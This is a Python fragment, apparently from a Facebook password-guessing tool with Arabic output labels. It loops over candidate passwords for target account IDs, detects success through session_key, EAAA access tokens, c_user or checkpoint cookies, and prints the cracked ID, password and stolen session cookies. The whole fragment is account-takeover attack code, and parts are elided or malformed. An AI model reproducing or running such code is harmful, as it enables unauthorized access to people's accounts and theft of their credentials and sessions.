	...
	for pw in pwv:
		try:
			...
			if "session_key" in send.text and "EAAA" in send.text and "c_user" in send.text:
				print('\n')
				print(f'035[32;1m √صيد:n√ ايدي: {idf}n√ باسورد: {pw}')
				ok+=1
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print('\n')
				print(f'033[36;1m× سكيور:n × ايدي: {idf}n× باسورد: {pw}')
				cp+=1
				break
				continue
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print('\n')
				print(f'033[31;1m[ + ] صيد:n[ + ] ID: {idf}n√ باسورد: {pw}n[√ كوكيز: {kuki}')
				break
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				print(f'√ ايدي: {idf}n√ باسورد: {pw}n√ كوكيز: {kuki}')
				break
